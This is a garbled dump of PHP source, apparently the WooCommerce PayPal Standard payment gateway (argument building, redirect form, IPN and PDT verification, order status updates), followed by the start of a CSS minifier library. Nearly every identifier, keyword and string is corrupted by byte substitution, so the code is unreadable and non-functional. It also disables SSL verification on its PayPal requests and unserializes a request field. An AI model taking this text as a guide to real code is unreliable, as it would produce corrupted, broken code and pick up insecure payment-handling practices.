$Üd”
->
Üd”_key
 ) ),

307 'nÙify_u¾' => 
$this
->
nÙify_u¾
,

310 'fœ¡_Çme' => 
$Üd”
->
blšg_fœ¡_Çme
,

311 'Ï¡_Çme' => 
$Üd”
->
blšg_Ï¡_Çme
,

312 'com·ny' => 
$Üd”
->
blšg_com·ny
,

313 'add»ss1' => 
$Üd”
->
blšg_add»ss_1
,

314 'add»ss2' => 
$Üd”
->
blšg_add»ss_2
,

315 'c™y' => 
$Üd”
->
blšg_c™y
,

316 '¡©e' => 
$this
->
	`g‘_·y·l_¡©e
Ğ
$Üd”
->
blšg_couÁry
, $Üd”->
blšg_¡©e
 ),

317 'z' => 
$Üd”
->
blšg_po¡code
,

318 'couÁry' => 
$Üd”
->
blšg_couÁry
,

319 'ema' => 
$Üd”
->
blšg_ema


321 
$phÚe_¬gs


325 iàĞ'yes' =ğ
$this
->
£nd_shpšg
 ) {

326 
$·y·l_¬gs
['add»ss_ov”ride'] = ( 
$this
->
add»ss_ov”ride
 == 'yes' ) ? 1 : 0;

328 
$·y·l_¬gs
['no_shipping'] = 0;

331 
$·y·l_¬gs
['fœ¡_Çme'] = 
$Üd”
->
shpšg_fœ¡_Çme
;

332 
$·y·l_¬gs
['Ï¡_Çme'] = 
$Üd”
->
shpšg_Ï¡_Çme
;

333 
$·y·l_¬gs
['com·ny'] = 
$Üd”
->
shpšg_com·ny
;

334 
$·y·l_¬gs
['add»ss1'] = 
$Üd”
->
shpšg_add»ss_1
;

335 
$·y·l_¬gs
['add»ss2'] = 
$Üd”
->
shpšg_add»ss_2
;

336 
$·y·l_¬gs
['c™y'] = 
$Üd”
->
shpšg_c™y
;

337 
$·y·l_¬gs
['¡©e'] = 
$this
->
	`g‘_·y·l_¡©e
Ğ
$Üd”
->
shpšg_couÁry
, $Üd”->
shpšg_¡©e
 );

338 
$·y·l_¬gs
['couÁry'] = 
$Üd”
->
shpšg_couÁry
;

339 
$·y·l_¬gs
['z'] = 
$Üd”
->
shpšg_po¡code
;

341 
$·y·l_¬gs
['no_shipping'] = 1;

345 iàĞ
	`g‘_İtiÚ
Ğ'woocomm”û_´iûs_šşude_x' ) =ğ'yes' || 
$Üd”
->
	`g‘_Üd”_discouÁ
(è> 0 || ( Ğ$Üd”->
	`g‘_™ems
(èè+ Ğ$Üd”->
	`g‘_ães
() ) ) >= 9 ) {

348 
$·y·l_¬gs
['discouÁ_amouÁ_ÿ¹'] = 
$Üd”
->
	`g‘_Üd”_discouÁ
();

351 
$™em_Çmes
 = 
	`¬¿y
();

353 iàĞĞ
$Üd”
->
	`g‘_™ems
() ) > 0 ) {

354 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_™ems
(è
as
 
$™em
 ) {

355 iàĞ
$™em
['qty'] ) {

356 
$™em_Çmes
[] = 
$™em
['name'] . ' x ' . $item['qty'];

361 
$·y·l_¬gs
['™em_Çme_1'] = 
$this
->
	`·y·l_™em_Çme
Ğ
	`¥rštf
Ğ
	`__
Ğ'Ord” %s' , 'woocomm”û'), 
$Üd”
->
	`g‘_Üd”_numb”
(èè. " - " . 
	`im¶ode
Ğ', ', 
$™em_Çmes
 ) );

362 
$·y·l_¬gs
['quantity_1'] = 1;

363 
$·y·l_¬gs
['amouÁ_1'] = 
	`numb”_fÜm©
Ğ
$Üd”
->
	`g‘_tÙ®
(è- 
	`round
Ğ$Üd”->
	`g‘_tÙ®_shpšg
(è+ $Üd”->
	`g‘_shpšg_x
(), 2 ) + $Üd”->
	`g‘_Üd”_discouÁ
(), 2, '.', '' );

369 iàĞĞ
$Üd”
->
	`g‘_tÙ®_shpšg
(è+ $Üd”->
	`g‘_shpšg_x
() ) > 0 ) {

370 
$·y·l_¬gs
['™em_Çme_2'] = 
$this
->
	`·y·l_™em_Çme
Ğ
	`__
Ğ'Shpšg vŸ', 'woocomm”û' ) . ' ' . 
	`ucwÜds
Ğ
$Üd”
->
	`g‘_shpšg_m‘hod
() ) );

371 
$·y·l_¬gs
['quantity_2'] = '1';

372 
$·y·l_¬gs
['amouÁ_2'] = 
	`numb”_fÜm©
Ğ
$Üd”
->
	`g‘_tÙ®_shpšg
(è+ $Üd”->
	`g‘_shpšg_x
(), 2, '.', '' );

378 
$·y·l_¬gs
['x_ÿ¹'] = 
$Üd”
->
	`g‘_tÙ®_x
();

381 
$™em_loİ
 = 0;

382 iàĞĞ
$Üd”
->
	`g‘_™ems
() ) > 0 ) {

383 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_™ems
(è
as
 
$™em
 ) {

384 iàĞ
$™em
['qty'] ) {

386 
$™em_loİ
++;

388 
$´oduù
 = 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

390 
$™em_Çme
 = 
$™em
['name'];

392 
$™em_m‘a
 = 
Ãw
 
	`WC_Ord”_I‹m_M‘a
Ğ
$™em
['item_meta'] );

393 iàĞ
$m‘a
 = 
$™em_m‘a
->
	`di¥Ïy
Ğ
Œue
,rue ) ) {

394 
$™em_Çme
 .ğ' ( ' . 
$m‘a
 . ' )';

397 
$·y·l_¬gs
[ '™em_Çme_' . 
$™em_loİ
 ] = 
$this
->
	`·y·l_™em_Çme
Ğ
$™em_Çme
 );

398 
$·y·l_¬gs
[ 'quªt™y_' . 
$™em_loİ
 ] = 
$™em
['qty'];

399 
$·y·l_¬gs
[ 'amouÁ_' . 
$™em_loİ
 ] = 
$Üd”
->
	`g‘_™em_subtÙ®
Ğ
$™em
, 
çl£
 );

401 iàĞ
$´oduù
->
	`g‘_sku
() ) {

402 
$·y·l_¬gs
[ '™em_numb”_' . 
$™em_loİ
 ] = 
$´oduù
->
	`g‘_sku
();

409 iàĞ
$Üd”
->
	`g‘_ÿ¹_discouÁ
() > 0 ) {

410 
$·y·l_¬gs
['discouÁ_amouÁ_ÿ¹'] = 
	`round
Ğ
$Üd”
->
	`g‘_ÿ¹_discouÁ
(), 2 );

414 iàĞĞ
$Üd”
->
	`g‘_ães
() ) > 0 ) {

415 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_ães
(è
as
 
$™em
 ) {

416 
$™em_loİ
++;

418 
$·y·l_¬gs
[ '™em_Çme_' . 
$™em_loİ
 ] = 
$this
->
	`·y·l_™em_Çme
Ğ
$™em
['name'] );

419 
$·y·l_¬gs
[ 'quªt™y_' . 
$™em_loİ
 ] = 1;

420 
$·y·l_¬gs
[ 'amouÁ_' . 
$™em_loİ
 ] = 
$™em
['line_total'];

425 iàĞ
$Üd”
->
	`g‘_tÙ®_shpšg
() > 0 ) {

426 
$™em_loİ
++;

427 
$·y·l_¬gs
[ '™em_Çme_' . 
$™em_loİ
 ] = 
$this
->
	`·y·l_™em_Çme
Ğ
	`¥rštf
Ğ
	`__
Ğ'Shpšg vŸ %s', 'woocomm”û' ), 
$Üd”
->
	`g‘_shpšg_m‘hod
() ) );

428 
$·y·l_¬gs
[ 'quªt™y_' . 
$™em_loİ
 ] = '1';

429 
$·y·l_¬gs
[ 'amouÁ_' . 
$™em_loİ
 ] = 
	`numb”_fÜm©
Ğ
$Üd”
->
	`g‘_tÙ®_shpšg
(), 2, '.', '' );

434 
$·y·l_¬gs
 = 
	`­¶y_f‹rs
( 'woocommerce_paypal_args', $paypal_args );

436  
$·y·l_¬gs
;

437 
	}
}

446 
funùiÚ
 
	$g’”©e_·y·l_fÜm
Ğ
$Üd”_id
 ) {

448 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

450 iàĞ'yes' =ğ
$this
->
‹¡mode
 ) {

451 
$·y·l_adr
 = 
$this
->
‹¡u¾
 . '?test_ipn=1&';

453 
$·y·l_adr
 = 
$this
->
liveu¾
 . '?';

456 
$·y·l_¬gs
 = 
$this
->
	`g‘_·y·l_¬gs
Ğ
$Üd”
 );

458 
$·y·l_¬gs_¬¿y
 = 
	`¬¿y
();

460 
	`fÜ—ch
 ( 
$·y·l_¬gs
 
as
 
$key
 => 
$v®ue
 ) {

461 
$·y·l_¬gs_¬¿y
[] = '<špuˆty³="hidd’"‚ame="'.
	`esc_©Œ
Ğ
$key
 ) . '" v®ue="' .ƒsc_©ŒĞ
$v®ue
 ) . '" />';

464 
	`wc_’queue_js
( '

465 
$
.
	`blockUI
({

466 
mes§ge
: "' .ƒsc_js( __( 'Thank you for your order. We‡re‚ow„edirecting youo PayPalo make…ayment.', 'woocommerce' ) ) . '",

467 
ba£Z
: 99999,

468 
ov”ÏyCSS
:

470 
background
: "#fff",

471 
İac™y
: 0.6

473 
css
: {

474 
·ddšg
: "20px",

475 
zšdex
: "9999999",

476 
‹xtAlign
: "center",

477 
cŞÜ
: "#555",

478 
bÜd”
: "3px solid #aaa",

479 
backgroundCŞÜ
:"#fff",

480 
cursÜ
: "wait",

481 
lšeHeight
: "24px",

484 
	`jQu”y
("#subm™_·y·l_·ym’t_fÜm").
	`şick
();

487  '<fÜm‡ùiÚ="' . 
	`esc_u¾
Ğ
$·y·l_adr
 ) . '" method="post" id="paypal_payment_form"arget="_top">

489 <!-- 
Bu‰Ú
 
F®lback
 -->

490 <
div
 
şass
="payment_buttons">

491 <
šput
 
ty³
="subm™" 
şass
="bu‰Ú‡É" 
id
="subm™_·y·l_·ym’t_fÜm" 
v®ue
="' . __Ğ'Pay vŸ PayP®', 'woocomm”û' ) . '" /> <
a
 cÏss="bu‰Ú cªûl" 
h»f
="' .ƒsc_u¾Ğ$Üd”->g‘_ÿnûl_Üd”_u¾(èè. '">' . __Ğ'
Cªûl
 
Üd”
 &
amp
; 
»¡Üe
 
ÿ¹
', '
woocomm”û
' ) . '</a>

492 </
div
>

493 <
süt
 
ty³
="text/javascript">

494 
	`jQu”y
(".·ym’t_bu‰Ús").
	`hide
();

495 </
süt
>

496 </
fÜm
>';

498 
	}
}

507 
funùiÚ
 
	$´oûss_·ym’t
Ğ
$Üd”_id
 ) {

509 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

511 iàĞ! 
$this
->
fÜm_submissiÚ_m‘hod
 ) {

513 
$·y·l_¬gs
 = 
$this
->
	`g‘_·y·l_¬gs
Ğ
$Üd”
 );

515 
$·y·l_¬gs
 = 
	`h‰p_bud_qu”y
( $paypal_args, '', '&' );

517 iàĞ'yes' =ğ
$this
->
‹¡mode
 ) {

518 
$·y·l_adr
 = 
$this
->
‹¡u¾
 . '?test_ipn=1&';

520 
$·y·l_adr
 = 
$this
->
liveu¾
 . '?';

523  
	`¬¿y
(

525 '»dœeù' => 
$·y·l_adr
 . 
$·y·l_¬gs


530  
	`¬¿y
(

532 '»dœeù' => 
$Üd”
->
	`g‘_checkout_·ym’t_u¾
Ğ
Œue
 )

537 
	}
}

545 
funùiÚ
 
	$»ût_·ge
Ğ
$Üd”
 ) {

546 
echo
 '<p>' . 
	`__
( 'Thank you - your order is‚ow…ending…ayment. You should be‡utomatically„edirectedo PayPalo make…ayment.', 'woocommerce' ) . '</p>';

548 
echo
 
$this
->
	`g’”©e_·y·l_fÜm
Ğ
$Üd”
 );

549 
	}
}

554 
funùiÚ
 
	$check_n_»que¡_is_v®id
Ğ
$n_»¥Ú£
 ) {

557 iàĞ'yes' =ğ
$this
->
‹¡mode
 ) {

558 
$·y·l_adr
 = 
$this
->
‹¡u¾
;

560 
$·y·l_adr
 = 
$this
->
liveu¾
;

563 iàĞ'yes' =ğ
$this
->
debug
 ) {

564 
$this
->
log
->
	`add
Ğ'·y·l', 'Checkšg IPN„e¥Ú£ i v®id vŸ ' . 
$·y·l_adr
 . '...' );

568 
$v®id©e_n
 = 
	`¬¿y
( 'cmd' => '_notify-validate' );

569 
$v®id©e_n
 +ğ
	`¡r¦ashes_d“p
Ğ
$n_»¥Ú£
 );

572 
$·¿ms
 = 
	`¬¿y
(

573 'body' => 
$v®id©e_n
,

574 's¦v”ify' => 
çl£
,

577 'com´ess' => 
çl£
,

578 'decom´ess' => 
çl£
,

579 'u£r-ag’t' => 'WooComm”û/' . 
	`WC
()->
v”siÚ


582 iàĞ'yes' =ğ
$this
->
debug
 ) {

583 
$this
->
log
->
	`add
Ğ'·y·l', 'IPN Reque¡: ' . 
	`´št_r
Ğ
$·¿ms
, 
Œue
 ) );

587 
$»¥Ú£
 = 
	`wp_»mÙe_po¡
Ğ
$·y·l_adr
, 
$·¿ms
 );

589 iàĞ'yes' =ğ
$this
->
debug
 ) {

590 
$this
->
log
->
	`add
Ğ'·y·l', 'IPN Re¥Ú£: ' . 
	`´št_r
Ğ
$»¥Ú£
, 
Œue
 ) );

594 iàĞ! 
	`is_wp_”rÜ
Ğ
$»¥Ú£
 ) && $»¥Ú£['»¥Ú£']['code'] >ğ200 && $»¥Ú£['»¥Ú£']['code'] < 300 && ( 
	`¡rcmp
( $response['body'], "VERIFIED" ) == 0 ) ) {

595 iàĞ'yes' =ğ
$this
->
debug
 ) {

596 
$this
->
log
->
	`add
( 'paypal', 'Received valid„esponse from PayPal' );

599  
Œue
;

602 iàĞ'yes' =ğ
$this
->
debug
 ) {

603 
$this
->
log
->
	`add
( 'paypal', 'Received invalid„esponse from PayPal' );

604 iàĞ
	`is_wp_”rÜ
Ğ
$»¥Ú£
 ) ) {

605 
$this
->
log
->
	`add
Ğ'·y·l', 'E¼Ü„e¥Ú£: ' . 
$»¥Ú£
->
	`g‘_”rÜ_mes§ge
() );

609  
çl£
;

610 
	}
}

618 
funùiÚ
 
	$check_n_»¥Ú£
() {

620 @
	`ob_ş—n
();

622 
$n_»¥Ú£
 = ! 
	`em±y
Ğ
$_POST
 ) ? $_POST : 
çl£
;

624 iàĞ
$n_»¥Ú£
 && 
$this
->
	`check_n_»que¡_is_v®id
( $ipn_response ) ) {

626 
	`h—d”
( 'HTTP/1.1 200 OK' );

628 
	`do_aùiÚ
Ğ"v®id-·y·l-¡ªd¬d-n-»que¡", 
$n_»¥Ú£
 );

632 
	`wp_d›
Ğ"PayP® IPN Reque¡ Fau»", "PayP® IPN", 
	`¬¿y
( 'response' => 200 ) );

636 
	}
}

645 
funùiÚ
 
	$sucûssful_»que¡
Ğ
$po¡ed
 ) {

647 
$po¡ed
 = 
	`¡r¦ashes_d“p
( $posted );

650 iàĞ! 
	`em±y
Ğ
$po¡ed
['invoice'] ) && !ƒmpty( $posted['custom'] ) ) {

652 
$Üd”
 = 
$this
->
	`g‘_·y·l_Üd”
Ğ
$po¡ed
['custom'], $posted['invoice'] );

654 iàĞ'yes' =ğ
$this
->
debug
 ) {

655 
$this
->
log
->
	`add
Ğ'·y·l', 'Found ord” #' . 
$Üd”
->
id
 );

659 
$po¡ed
['·ym’t_¡©us'] = 
	`¡¹Şow”
( $posted['payment_status'] );

660 
$po¡ed
['txn_ty³'] = 
	`¡¹Şow”
( $posted['txn_type'] );

663 iàĞ1 =ğ
$po¡ed
['test_ipn'] && 'pending' == $posted['payment_status'] ) {

664 
$po¡ed
['payment_status'] = 'completed';

667 iàĞ'yes' =ğ
$this
->
debug
 ) {

668 
$this
->
log
->
	`add
Ğ'·y·l', 'Paym’ˆ¡©us: ' . 
$po¡ed
['payment_status'] );

672  
$po¡ed
['payment_status'] ) {

677 iàĞ
$Üd”
->
¡©us
 == 'completed' ) {

678 iàĞ'yes' =ğ
$this
->
debug
 ) {

679 
$this
->
log
->
	`add
Ğ'·y·l', 'AbÜtšg, Ord” #' . 
$Üd”
->
id
 . ' is‡lready complete.' );

681 
ex™
;

685 
$acû±ed_ty³s
 = 
	`¬¿y
( 'cart', 'instant', 'express_checkout', 'web_accept', 'masspay', 'send_money' );

687 iàĞ! 
	`š_¬¿y
Ğ
$po¡ed
['txn_ty³'], 
$acû±ed_ty³s
 ) ) {

688 iàĞ'yes' =ğ
$this
->
debug
 ) {

689 
$this
->
log
->
	`add
Ğ'·y·l', 'AbÜtšg, Inv®idy³:' . 
$po¡ed
['txn_type'] );

691 
ex™
;

695 iàĞ
$Üd”
->
	`g‘_Üd”_cu¼’cy
(è!ğ
$po¡ed
['mc_currency'] ) {

696 iàĞ'yes' =ğ
$this
->
debug
 ) {

697 
$this
->
log
->
	`add
Ğ'·y·l', 'Paym’ˆ”rÜ: Cu¼’c› dØnÙ m©ch (£Á "' . 
$Üd”
->
	`g‘_Üd”_cu¼’cy
(è. '" |„‘uºed "' . 
$po¡ed
['mc_currency'] . '")' );

701 
$Üd”
->
	`upd©e_¡©us
Ğ'Ú-hŞd', 
	`¥rštf
Ğ
	`__
Ğ'V®id©iÚƒ¼Ü: PayP® cu¼’c› dØnÙ m©ch (cod%s).', 'woocomm”û' ), 
$po¡ed
['mc_currency'] ) );

702 
ex™
;

706 iàĞ
$Üd”
->
	`g‘_tÙ®
(è!ğ
$po¡ed
['mc_gross'] ) {

707 iàĞ'yes' =ğ
$this
->
debug
 ) {

708 
$this
->
log
->
	`add
Ğ'·y·l', 'Paym’ˆ”rÜ: AmouÁ dØnÙ m©ch (gros ' . 
$po¡ed
['mc_gross'] . ')' );

712 
$Üd”
->
	`upd©e_¡©us
Ğ'Ú-hŞd', 
	`¥rštf
Ğ
	`__
Ğ'V®id©iÚƒ¼Ü: PayP®‡mouÁ dØnÙ m©ch (gros %s).', 'woocomm”û' ), 
$po¡ed
['mc_gross'] ) );

713 
ex™
;

717 iàĞ
	`¡rÿ£cmp
Ğ
	`Œim
Ğ
$po¡ed
['»ûiv”_ema'] ),rimĞ
$this
->
»ûiv”_ema
 ) ) != 0 ) {

718 iàĞ'yes' =ğ
$this
->
debug
 ) {

719 
$this
->
log
->
	`add
( 'paypal', "IPN Response is for‡nother one: {$posted['receiver_email']} ourƒmail is {$this->receiver_email}" );

723 
$Üd”
->
	`upd©e_¡©us
Ğ'Ú-hŞd', 
	`¥rštf
Ğ
	`__
Ğ'V®id©iÚƒ¼Ü: PayP® IPN„e¥Ú£ from‡ difã»Áƒma‡dd»s (%s).', 'woocomm”û' ), 
$po¡ed
['receiver_email'] ) );

725 
ex™
;

729 iàĞ! 
	`em±y
Ğ
$po¡ed
['payer_email'] ) ) {

730 
	`upd©e_po¡_m‘a
Ğ
$Üd”
->
id
, 'Pay” PayP®‡dd»ss', 
	`wc_ş—n
Ğ
$po¡ed
['payer_email'] ) );

732 iàĞ! 
	`em±y
Ğ
$po¡ed
['txn_id'] ) ) {

733 
	`upd©e_po¡_m‘a
Ğ
$Üd”
->
id
, 'T¿n§ùiÚ ID', 
	`wc_ş—n
Ğ
$po¡ed
['txn_id'] ) );

735 iàĞ! 
	`em±y
Ğ
$po¡ed
['first_name'] ) ) {

736 
	`upd©e_po¡_m‘a
Ğ
$Üd”
->
id
, 'Pay” fœ¡‚ame', 
	`wc_ş—n
Ğ
$po¡ed
['first_name'] ) );

738 iàĞ! 
	`em±y
Ğ
$po¡ed
['last_name'] ) ) {

739 
	`upd©e_po¡_m‘a
Ğ
$Üd”
->
id
, 'Pay”†a¡‚ame', 
	`wc_ş—n
Ğ
$po¡ed
['last_name'] ) );

741 iàĞ! 
	`em±y
Ğ
$po¡ed
['payment_type'] ) ) {

742 
	`upd©e_po¡_m‘a
Ğ
$Üd”
->
id
, 'Paym’ˆty³', 
	`wc_ş—n
Ğ
$po¡ed
['payment_type'] ) );

745 iàĞ
$po¡ed
['payment_status'] == 'completed' ) {

746 
$Üd”
->
	`add_Üd”_nÙe
Ğ
	`__
( 'IPN…ayment completed', 'woocommerce' ) );

747 
$Üd”
->
	`·ym’t_com¶‘e
();

749 
$Üd”
->
	`upd©e_¡©us
Ğ'Ú-hŞd', 
	`¥rštf
Ğ
	`__
Ğ'Paym’ˆ³ndšg: %s', 'woocomm”û' ), 
$po¡ed
['pending_reason'] ) );

752 iàĞ'yes' =ğ
$this
->
debug
 ) {

753 
$this
->
log
->
	`add
( 'paypal', 'Payment complete.' );

762 
$Üd”
->
	`upd©e_¡©us
Ğ'çed', 
	`¥rštf
Ğ
	`__
Ğ'Paym’ˆ% vŸ IPN.', 'woocomm”û' ), 
	`¡¹Şow”
Ğ
$po¡ed
['payment_status'] ) ) );

767 iàĞ
$Üd”
->
	`g‘_tÙ®
(è=ğĞ
$po¡ed
['mc_gross'] * -1 ) ) {

770 
$Üd”
->
	`upd©e_¡©us
Ğ'»funded', 
	`¥rštf
Ğ
	`__
Ğ'Paym’ˆ% vŸ IPN.', 'woocomm”û' ), 
	`¡¹Şow”
Ğ
$po¡ed
['payment_status'] ) ) );

772 
$ma”
 = 
	`WC
()->
	`ma”
();

774 
$mes§ge
 = 
$ma”
->
	`w¿p_mes§ge
(

775 
	`__
( 'Order„efunded/reversed', 'woocommerce' ),

776 
	`¥rštf
Ğ
	`__
Ğ'Ord” % ha b“Àm¬ked‡ »funded - PayP®„—sÚ code: %s', 'woocomm”û' ), 
$Üd”
->
	`g‘_Üd”_numb”
(), 
$po¡ed
['reason_code'] )

779 
$ma”
->
	`£nd
Ğ
	`g‘_İtiÚ
Ğ'admš_ema' ), 
	`¥rštf
Ğ
	`__
Ğ'Paym’ˆfÜ ord” % »funded/»v”£d', 'woocomm”û' ), 
$Üd”
->
	`g‘_Üd”_numb”
(è), 
$mes§ge
 );

787 
$Üd”
->
	`upd©e_¡©us
Ğ'Ú-hŞd', 
	`¥rštf
Ğ
	`__
Ğ'Paym’ˆ% vŸ IPN.', 'woocomm”û' ), 
	`¡¹Şow”
Ğ
$po¡ed
['payment_status'] ) ) );

789 
$ma”
 = 
	`WC
()->
	`ma”
();

791 
$mes§ge
 = 
$ma”
->
	`w¿p_mes§ge
(

792 
	`__
( 'Order„eversed', 'woocommerce' ),

793 
	`¥rštf
(
	`__
Ğ'Ord” % ha b“Àm¬ked on-hŞd dutØ¨»v”§È- PayP®„—sÚ code: %s', 'woocomm”û' ), 
$Üd”
->
	`g‘_Üd”_numb”
(), 
$po¡ed
['reason_code'] )

796 
$ma”
->
	`£nd
Ğ
	`g‘_İtiÚ
Ğ'admš_ema' ), 
	`¥rštf
Ğ
	`__
Ğ'Paym’ˆfÜ ord” % »v”£d', 'woocomm”û' ), 
$Üd”
->
	`g‘_Üd”_numb”
(è), 
$mes§ge
 );

801 
$ma”
 = 
	`WC
()->
	`ma”
();

803 
$mes§ge
 = 
$ma”
->
	`w¿p_mes§ge
(

804 
	`__
( 'Reversal Cancelled', 'woocommerce' ),

805 
	`¥rštf
Ğ
	`__
Ğ'Ord” % ha had‡„ev”§ÈÿnûÎed. PËa£ checkh¡©u oà·ym’ˆªd upd©thÜd” stu accÜdšgly.', 'woocomm”û' ), 
$Üd”
->
	`g‘_Üd”_numb”
() )

808 
$ma”
->
	`£nd
Ğ
	`g‘_İtiÚ
Ğ'admš_ema' ), 
	`¥rštf
Ğ
	`__
Ğ'Rev”§ÈÿnûÎed fÜ ord” %s', 'woocomm”û' ), 
$Üd”
->
	`g‘_Üd”_numb”
(è), 
$mes§ge
 );

816 
ex™
;

819 
	}
}

826 
public
 
funùiÚ
 
	$pdt_»tuº_hªdËr
() {

827 
$po¡ed
 = 
	`¡r¦ashes_d“p
Ğ
$_REQUEST
 );

829 iàĞ! 
	`em±y
Ğ
$this
->
id’t™y_tok’
 ) && !ƒm±yĞ
$po¡ed
['cm'] ) ) {

831 
$Üd”
 = 
$this
->
	`g‘_·y·l_Üd”
Ğ
$po¡ed
['cm'] );

833 iàĞ'³ndšg' !ğ
$Üd”
->
¡©us
 ) {

834  
çl£
;

837 
$po¡ed
['¡'] = 
	`¡¹Şow”
( $posted['st'] );

839  
$po¡ed
['st'] ) {

843 iàĞ'yes' =ğ
$this
->
‹¡mode
 ) {

844 
$·y·l_adr
 = 
$this
->
‹¡u¾
;

846 
$·y·l_adr
 = 
$this
->
liveu¾
;

849 
$pdt
 = 
	`¬¿y
(

850 'body' => 
	`¬¿y
(

852 'tx' => 
$po¡ed
['tx'],

853 '©' => 
$this
->
id’t™y_tok’


855 's¦v”ify' => 
çl£
,

858 'u£r-ag’t' => 'WooComm”û/' . 
WC_VERSION


862 
$»¥Ú£
 = 
	`wp_»mÙe_po¡
Ğ
$·y·l_adr
, 
$pdt
 );

864 iàĞ
	`is_wp_”rÜ
Ğ
$»¥Ú£
 ) ) {

865  
çl£
;

868 iàĞ! 
	`¡½os
Ğ
$»¥Ú£
['body'], "SUCCESS" ) === 0 ) {

869  
çl£
;

873 iàĞ
$Üd”
->
	`g‘_tÙ®
(è!ğ
$po¡ed
['amt'] ) {

875 iàĞ'yes' =ğ
$this
->
debug
 ) {

876 
$this
->
log
->
	`add
Ğ'·y·l', 'Paym’ˆ”rÜ: AmouÁ dØnÙ m©ch (amˆ' . 
$po¡ed
['amt'] . ')' );

880 
$Üd”
->
	`upd©e_¡©us
Ğ'Ú-hŞd', 
	`¥rštf
Ğ
	`__
Ğ'V®id©iÚƒ¼Ü: PayP®‡mouÁ dØnÙ m©ch (amˆ%s).', 'woocomm”û' ), 
$po¡ed
['amt'] ) );

881  
Œue
;

886 
	`upd©e_po¡_m‘a
Ğ
$Üd”
->
id
, 'T¿n§ùiÚ ID', 
	`wc_ş—n
Ğ
$po¡ed
['tx'] ) );

888 
$Üd”
->
	`add_Üd”_nÙe
Ğ
	`__
( 'PDT…ayment completed', 'woocommerce' ) );

889 
$Üd”
->
	`·ym’t_com¶‘e
();

890  
Œue
;

897  
çl£
;

898 
	}
}

907 
´iv©e
 
funùiÚ
 
g‘_·y·l_Üd”
Ğ
$cu¡om
, 
$švoiû
 = '' ) {

908 
$cu¡om
 = 
maybe_un£rŸlize
( $custom );

911 iàĞ
is_num”ic
Ğ
$cu¡om
 ) ) {

912 
	g$Üd”_id
 = (è
$cu¡om
;

913 
	g$Üd”_key
 = 
$švoiû
;

914 } 
–£if
Ğ
is_¡ršg
Ğ
$cu¡om
 ) ) {

915 
	g$Üd”_id
 = (è
¡r_»¶aû
Ğ
$this
->
švoiû_´efix
, '', 
$cu¡om
 );

916 
	g$Üd”_key
 = 
$cu¡om
;

918 
li¡
Ğ
$Üd”_id
, 
$Üd”_key
 ) = 
$cu¡om
;

921 
	g$Üd”
 = 
Ãw
 
WC_Ord”
Ğ
$Üd”_id
 );

923 iàĞ! 
is£t
Ğ
$Üd”
->
id
 ) ) {

925 
	g$Üd”_id
 = 
wc_g‘_Üd”_id_by_Üd”_key
Ğ
$Üd”_key
 );

926 
	g$Üd”
 = 
Ãw
 
WC_Ord”
Ğ
$Üd”_id
 );

930 iàĞ
	g$Üd”
->
	gÜd”_key
 !=ğ
$Üd”_key
 ) {

931 iàĞ'yes' =ğ
$this
->
debug
 ) {

932 
$this
->
log
->
add
( 'paypal', 'Error: Order Key does‚ot match invoice.' );

934 
	gex™
;

937  
	g$Üd”
;

946 
public
 
funùiÚ
 
	$g‘_·y·l_¡©e
Ğ
$cc
, 
$¡©e
 ) {

947 iàĞ'US' ==ğ
$cc
 ) {

948  
$¡©e
;

951 
$¡©es
 = 
	`WC
()->
couÁr›s
->
	`g‘_¡©es
Ğ
$cc
 );

953 iàĞ
	`is£t
Ğ
$¡©es
[ 
$¡©e
 ] ) ) {

954  
$¡©es
[ 
$¡©e
 ];

957  
$¡©e
;

958 
	}
}

	@includes/libraries/class-cssmin.php

1 <?
php


35 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

49 
ab¡¿ù
 cÏs 
	caCssTok’


56 
ab¡¿ù
 
public
 
funùiÚ
 
__toSŒšg
();

69 
ab¡¿ù
 cÏs 
	caCssRuË£tS¹Tok’
 
ex‹nds
 
	maCssTok’


84 
ab¡¿ù
 cÏs 
	caCssRuË£tEndTok’
 
ex‹nds
 
	maCssTok’


91 
public
 
funùiÚ
 
	$__toSŒšg
()

95 
	}
}

110 
ab¡¿ù
 cÏs 
	caCssP¬£rPlugš


117 
´Ùeùed
 
	m$cÚfigu¿tiÚ
 = 
¬¿y
();

123 
´Ùeùed
 
	m$·r£r
 = 
nuÎ
;

129 
´Ùeùed
 
	m$bufãr
 = "";

137 
public
 
funùiÚ
 
	$__cÚ¡ruù
(
CssP¬£r
 
$·r£r
, 
¬¿y
 
$cÚfigu¿tiÚ
 = 
nuÎ
)

139 
$this
->
cÚfigu¿tiÚ
 = 
$cÚfigu¿tiÚ
;

140 
$this
->
·r£r
 = 
$·r£r
;

147 
ab¡¿ù
 
public
 
funùiÚ
 
	`g‘Trigg”Ch¬s
();

153 
ab¡¿ù
 
public
 
funùiÚ
 
	`g‘Trigg”S‹s
();

162 
ab¡¿ù
 
public
 
funùiÚ
 
	`·r£
(
$šdex
, 
$ch¬
, 
$´eviousCh¬
, 
$¡©e
);

163 
	}
}

178 
ab¡¿ù
 cÏs 
	caCssMšif›rPlugš


185 
´Ùeùed
 
	m$cÚfigu¿tiÚ
 = 
¬¿y
();

191 
´Ùeùed
 
	m$mšif›r
 = 
nuÎ
;

199 
public
 
funùiÚ
 
__cÚ¡ruù
(
CssMšif›r
 
$mšif›r
, 
¬¿y
 
$cÚfigu¿tiÚ
 = 
	$¬¿y
())

201 
$this
->
cÚfigu¿tiÚ
 = 
$cÚfigu¿tiÚ
;

202 
$this
->
mšif›r
 = 
$mšif›r
;

210 
ab¡¿ù
 
public
 
funùiÚ
 
	`­¶y
(
aCssTok’
 &
$tok’
);

216 
ab¡¿ù
 
public
 
funùiÚ
 
	`g‘Trigg”Tok’s
();

217 
	}
}

232 
ab¡¿ù
 cÏs 
	caCssMšif›rF‹r


239 
´Ùeùed
 
	m$cÚfigu¿tiÚ
 = 
¬¿y
();

245 
´Ùeùed
 
	m$mšif›r
 = 
nuÎ
;

253 
public
 
funùiÚ
 
__cÚ¡ruù
(
CssMšif›r
 
$mšif›r
, 
¬¿y
 
$cÚfigu¿tiÚ
 = 
	$¬¿y
())

255 
$this
->
cÚfigu¿tiÚ
 = 
$cÚfigu¿tiÚ
;

256 
$this
->
mšif›r
 = 
$mšif›r
;

264 
ab¡¿ù
 
public
 
